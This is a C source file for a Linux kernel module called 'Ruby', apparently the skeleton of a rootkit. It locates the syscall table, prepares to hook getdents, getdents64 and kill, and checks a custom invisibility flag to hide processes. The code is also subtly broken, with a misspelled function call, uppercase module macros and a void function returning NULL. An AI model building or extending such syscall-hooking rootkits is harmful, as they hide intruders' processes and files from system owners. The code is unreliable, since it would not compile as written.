//---------------------------------------------------+
#include<linux/kernel.h>//                           |
#include<linux/module.h>//         libraries         |
#include "library/ftrace_helper.h"//                 |
#include "library/Ruby.h"//                          |
//---------------------------------------------------+
#define RTHXR "rthxr"//         MACROS               |
//---------------------------------------------------+
//                                                                 Global Data
//--------------------------------------------------------------------------------------+
unsigned long *__sysc_table;//                                                          |
typedef asmlinkage (*t_syscall)(const struct pt_regs *);//                              |
//                                                                                      |
static t_syscall orig_getdents;//                                                       |
static t_syscall orig_getdents64;//                                                     |
static t_syscall orig_kill;//                                                           |
//--------------------------------------------------------------------------------------+

//                                                    Returning syscall table address  
//--------------------------------------------------------------------------------------+
unsigned long *__ret_syscall_table(void)//                                              |
{//                                                                                     |
    unsigned long *__sys_call_t;//                                                      |
    __sys_call_t = (unsigned long *)kallsyms_lookup_name("sys_call_table");//           |
//                                                                                      |
    return __sys_call_t;//                                                              |
}//-------------------------------------------------------------------------------------+

//                                                             Structing task list
//--------------------------------------------------------------------------------------+
struct task_struct *find_task(pid_t pid)//                                              |
{//                                                                                     |
    struct task_struct *p = current;//                                                  |
    for_each_process(p)//                                                               |
    {//                                                                                 |
        if(p->pid == pid)//                                                             |
        return p;//                                                                     |
    }//                                                                                 |
//                                                                                      |
    return NULL;//                                                                      |
}//-------------------------------------------------------------------------------------+

//                                     Checking if is invisible
//----------------------------------------------------------------+
int is_invisible(pid_t pid)//                                     |
{//                                                               |
    struct task_struct *task;//                                   |
    if(!pid)//                                                    |
        return 0;//                                               |
    task = find_task(pid);//                                      |
    if(!task)//                                                   |
        return 0;//                                               |
    if(task->flags & PF_INVISIBLE)//                              |
        return 1;//                                               |
//                                                                |
    return 0;//                                                   |
}//---------------------------------------------------------------+

static int __init ruby_init(void)
{
    __sysc_table = __ret_syscalL_table();
    return 0;
}

static void __exit ruby_exit(void)
{
    return NULL;
}

MODULE_INIT(ruby_init);
MODULE_EXIT(ruby_exit);
